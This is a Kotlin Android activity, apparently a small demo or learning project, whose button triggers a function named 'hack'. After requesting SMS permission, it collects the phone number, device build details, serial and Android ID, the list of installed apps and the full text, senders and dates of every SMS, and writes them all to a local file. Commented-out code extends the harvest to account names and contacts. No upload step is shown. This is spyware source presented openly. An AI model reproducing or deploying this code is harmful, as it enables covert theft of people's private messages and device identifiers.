package com.example.alf

import android.Manifest
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button
import java.io.File
import android.os.Build
import android.content.Context
import android.provider.Settings
import android.content.pm.ResolveInfo
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.telephony.TelephonyManager
import androidx.core.app.ActivityCompat
import java.util.*
import kotlin.collections.ArrayList


class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val b: Button = findViewById(R.id.button)
        ActivityCompat.requestPermissions(this@MainActivity, arrayOf(Manifest.permission.READ_SMS), 1)
        b.setOnClickListener { hack() }
    }

    fun hack(){
        //open a file to write
        val path = this.getExternalFilesDir(null)
        val directory = File(path, "SDF")
        directory.mkdirs()
        val file = File(directory,"information.txt")

        //get phone number
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        var phoneNumber = "access denied"
        if (!(ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        )) {
            phoneNumber = tm.line1Number
        }

        //get phone spcecs
        var systemData = "Device Information: "
        systemData = """${systemData}
        PHONE NUMBER : ${phoneNumber}
        VERSION.RELEASE : ${Build.VERSION.RELEASE}
        VERSION.INCREMENTAL : ${Build.VERSION.INCREMENTAL}
        VERSION.SDK.NUMBER : ${Build.VERSION.SDK_INT}
        BOARD : ${Build.BOARD}
        BOOTLOADER : ${Build.BOOTLOADER}
        BRAND : ${Build.BRAND}
        CPU_ABI : ${Build.CPU_ABI}
        CPU_ABI2 : ${Build.CPU_ABI2}
        DISPLAY : ${Build.DISPLAY}
        FINGERPRINT : ${Build.FINGERPRINT}
        HARDWARE : ${Build.HARDWARE}
        HOST : ${Build.HOST}
        ID : ${Build.ID}
        MANUFACTURER : ${Build.MANUFACTURER}
        MODEL : ${Build.MODEL}
        PRODUCT : ${Build.PRODUCT}
        SERIAL : ${Build.SERIAL}
        TAGS : ${Build.TAGS}
        TYPE : ${Build.TYPE}
        USER : ${Build.USER}
        ANDROID ID : ${Settings.Secure.getString(applicationContext.contentResolver, Settings.Secure.ANDROID_ID)}"""

        file.writeText(systemData)

        //get all visible installed aps
        val apkName: MutableList<String> = ArrayList()
        val intent = Intent(Intent.ACTION_MAIN, null)
        intent.addCategory(Intent.CATEGORY_LAUNCHER)
        val resolveInfoList: List<ResolveInfo> = this.packageManager.queryIntentActivities(intent, 0)

        for (resolveInfo in resolveInfoList) {
            val activityInfo = resolveInfo.activityInfo
            apkName.add(activityInfo.applicationInfo.packageName)
        }

        var apps = "\n\nInstalled aps:\n"
        for(app in apkName){
            apps = "${apps}\t${app}\n"
        }
        file.appendText(apps)

        //get the users' sms
        var sms = "SMS List: \n"
        val cursor = contentResolver.query(Uri.parse("content://sms/"),null,null,null,null)
        cursor!!.moveToFirst()
        if(cursor.count == 0){   //if there are no sms or contacts
            cursor.close()
            return
        }

        val address = cursor.getColumnIndex("address")
        val date = cursor.getColumnIndex("date")
        val msg = cursor.getColumnIndex("body")
        do {
            sms = "${sms}\t${cursor.getString(address)}: ${Date(cursor.getString(date).toLong())}: ${cursor.getString(msg)}\n"
        } while(cursor.moveToNext())
        cursor.close()
        file.appendText(sms)


        //var AccountDetails = "\nList Of Accounts:\n"
        //val accounts = AccountManager.get(this).accounts
        //for (account in accounts) {
        //    AccountDetails = "${AccountDetails}\t${account.type} : ${account.name}\n"
        //}
        //file.appendText(AccountDetails)

        //var contactsList = "\nList Of Contacts:\n"
        //val cr = contentResolver
        //val cur: Cursor? = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
        //if ((if (cur != null) cur.getCount() else 0) > 0) {
        //    while (cur != null && cur.moveToNext()) {
        //        val id: String = cur.getColumnIndex(ContactsContract.Contacts._ID).toString()
        //        val name: String = cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME).toString()
        //        if (cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER) > 0) {
        //            val pcur: Cursor? = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf(id), null)
        //            while (pcur!!.moveToNext()) {
        //                val phoneNo: String = pcur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER).toString()
        //                contactsList = "${contactsList}\t${name}:${phoneNo}\n"
        //            }
        //            pcur.close()
        //        }
        //    }
        //}
        //cur!!.close()
        //file.appendText(contactsList)
    }

}
